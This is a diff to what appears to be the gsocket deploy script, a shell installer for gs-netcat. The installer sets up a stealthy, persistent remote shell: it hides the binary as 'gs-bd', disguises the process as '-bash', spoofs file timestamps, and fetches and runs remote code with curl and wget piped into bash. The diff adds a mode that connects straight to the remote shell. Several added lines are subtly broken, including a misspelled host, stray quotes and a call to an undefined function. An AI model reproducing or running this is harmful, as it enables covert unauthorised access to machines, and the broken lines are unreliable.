@@ -6,9 +6,11 @@
 #   $ bash -c"$(curl -fsSL gsocket.io/x)"
 #
 # Pre-set a secret:
-#   $ X=MySecret bash -c"$(curl -fsSL gsocket.io/x)"
+#   $ X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
 # Uninstall
-#   $ GS_UNDO=1 bash -c"$(curl -fsSL gsocket.io/x)"
+#   $ GS_UNDO=1 bash -c" $(curl -fsSL gsocket.io/x)"
+# Access
+#   $ S=MySecret bash -c "$(curl -fsSL goscket.io/x)""
 #
 #
 # This can be used when:
@@ -27,7 +29,9 @@
 # Global Defines
 URL_BASE="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/"
 URL_DEPLOY="gsocket.io/x"
-DL_CMD="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
+DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
+DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
+# DL_CMD="$DL_CRL"
 BIN_HIDDEN_NAME_DEFAULT=gs-bd
 PROC_HIDDEN_NAME_DEFAULT=-bash
 CY="\033[1;33m" # yellow
@@ -182,6 +186,8 @@ init_setup()
 		touch -r /etc/rc.local "${GS_PREFIX}/etc/rc.local"
 	fi
 
+	command -v tar >/dev/null || errexit "Need tar. Try ${CM}apt install tar${CN}"
+	command -v gzip >/dev/null || errexit "Need gzip. Try ${CM}apt install gzip${CN}"
 	mkdir "$TMPDIR" &>/dev/null
 
 	touch "${TMPDIR}/.gs-${UID}.lock" || errexit "FAILED. No temporary directory found for downloading package."
@@ -303,14 +309,20 @@ FAIL_OUT()
 	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
 }
 
-WARN_OUT()
+WARN()
 {
 	echo -e 1>&2 "--> ${CY}WARNING: ${CN}$*"
 }
 
+WARN_EXECFAIL()
+{
+	echo -e 1>&2 "--> Please send this output to ${CC}members@thc.org${CN} to get it fixed."
+	echo -e 1>&2 "--> CODE=${1} (${2}): ${CY}$(uname -n -m -r)${CN}"
+}
+
 gs_secret_reload()
 {
-	[[ ! -f "$1" ]] && WARN_OUT "Oops. $1 not found. Uninstall needed?"
+	[[ ! -f "$1" ]] && WARN "Oops. $1 not found. Uninstall needed?"
 	# GS_SECRET="UNKNOWN" # never ever set GS_SECRET to a known value
 	local sec
 	sec=$(<"$1")
@@ -476,21 +488,71 @@ dl()
 
 	local dl_log
 
+	# Need to set DL_CMD before GS_DEBUG check for proper error output
+	if command -v curl >/dev/null; then
+		DL_CMD="$DL_CRL"
+	elif command -v wget >/dev/null; then
+		DL_CMD="$DL_WGT"
+	else
+		# errexit "Need curl or wget."
+		FAIL_OUT "Need curl or wget. Try ${CM}apt install curl${CN}"
+		errexit
+	fi
+
 	# Debugging / testing. Use local package if available
 	[[ -n "$GS_DEBUG" ]] && [[ -f "../tools/${1}" ]] && cp "../tools/${1}" "${2}" 2>/dev/null && return
 
-	if command -v curl >/dev/null; then
+	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
 		dl_log=$(curl -fL "${URL_BASE}/${1}" --output "${2}" 2>&1)
-	elif command -v wget >/dev/null; then
+	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
 		dl_log=$(wget --show-progress -O "$2" "${URL_BASE}/${1}" 2>&1)
 	else
 		# errexit "Need curl or wget."
-		FAIL_OUT "Need curl or wget. Try ${CM}apt-get install curl${CN}"
+		FAIL_OUT "CAN NOT HAPPEN"
 		errexit
 	fi
 
 	# [[ ! -s "$2" ]] && { errexit "Could not download package."; } 
 	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$dl_log"; exit_code 255; } 
+}
+
+# S= was set. Do not install but execute in place.
+gs_access()
+{
+	echo -e 2>&1 "Connecting..."
+	local ret
+	GS_SECRET="${S}"
+
+	"${TMPDIR}/gs-netcat" -s "${GS_SECRET}" -i
+	ret=$?
+	[[ $ret -eq 139 ]] && { EXECFAIL_OUT "$?" "SIGSEGV"; errexit; }
+
+	exit_code "$ret"
+}
+
+# binaries are in TMPDIR. Perform a functional test.
+# test_binaries <binary> <no_exec_test=1>
+test_binaries()
+{
+	local bin
+	local no_exec_test
+	bin="$1"
+	no_exec_test="$2"
+	GS_SECRET=$("$bin" -g)
+	[[ -z "$GS_SECRET" ]] && { FAIL_OUT; WARN_EXECFAIL "$?" "wrong binary"; errexit; }
+
+	# Only run exec test if installed with -l (not for gs_access)
+	[[ -n $no_exec_test ]] && return # no exec test (S= was specified)
+
+	# Connect to a random host to test binary, resolver and network connectivity.
+	local secret
+	secret=$("$bin" -g)
+	local log
+	log=$(GSOCKET_ARGS="-s selftest-${secret}" exec -a "$PROC_HIDDEN_NAME" "${bin}" 2>&1)
+
+	ret=$?
+	[[ $ret -eq 139 ]] && { FAIL_OUT; WARN_EXECFAIL "$?" "SIGSEGV"; errexit; }
+	[[ $ret -ne 255 ]] && { FAIL_OUT; echo "$log"; errexit; }
 }
 
 init_vars
@@ -502,23 +564,28 @@ init_setup
 
 # Download binaries
 echo -en 2>&1 "Downloading binaries.................................................."
-# echo -e 2>&1 "Downloading binaries..."
 dl "$SRC_PKG" "${TMPDIR}/${SRC_PKG}"
 OK_OUT
 
-echo -en 2>&1 "Copying binaries......................................................"
+echo -en 2>&1 "Unpacking binaries...................................................."
 # Unpack
-(cd "${TMPDIR}" && tar xfz "${SRC_PKG}") || { FAIL_OUT "unpacking failed"; errexit; }
+(cd "${TMPDIR}" && tar xfz "${SRC_PKG}" && chmod 700 "${TMPDIR}/gs-netcat") || { FAIL_OUT "unpacking failed"; errexit; }
+OK_OUT
 
+echo -en 2>&1 "Testing binaries......................................................"
+test_binaries "${TMPDIR}/gs-netcat" "${S}" # Also sets GS_SECRET
+OK_OUT
+
+# S= is set. Do not install but connect to remote using S= as secret.
+[[ -n $S ]] && gs_access
+
+echo -en 2>&1 "Copying binaries......................................................"
 mv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
 chmod 700 "$DSTBIN"
 OK_OUT
 
-GS_SECRET=$("$DSTBIN" -g)
-[[ -z "$GS_SECRET" ]] && { FAIL_OUT "Execution failed...wrong binary?"; errexit; }
 # User supplied secret: X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
 [[ -n $X ]] && GS_SECRET="$X"
-
 
 # -----BEGIN Install permanentally-----
 # Try to install system wide. This may also start the service.
@@ -574,7 +641,7 @@ elif [[ -z "$IS_GS_RUNNING" ]]; then
 			unset IS_NEED_START
 		else
 			OK_OUT
-			WARN_OUT "More than one ${BIN_HIDDEN_NAME} is running. You"
+			WARN "More than one ${BIN_HIDDEN_NAME} is running. You"
 			echo -e 1>&2 "             may want to check: ${CM}ps -elf|grep -- ${PROC_HIDDEN_NAME}${CN}"
 			echo -e 1>&2 "             or terminate all : ${CM}${KL_CMD} ${BIN_HIDDEN_NAME}${CN}"
 		fi
@@ -588,7 +655,10 @@ elif [[ -z "$IS_GS_RUNNING" ]]; then
 	fi
 fi
 
-echo -e 1>&2 "--> Type ${CM}gs-netcat -s \"$GS_SECRET\" -i${CN} to connect."
+echo -e 1>&2 "--> To connect type one of the following:
+--> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}
+--> ${CM}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
+--> ${CM}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"
 
 
 exit_code 0
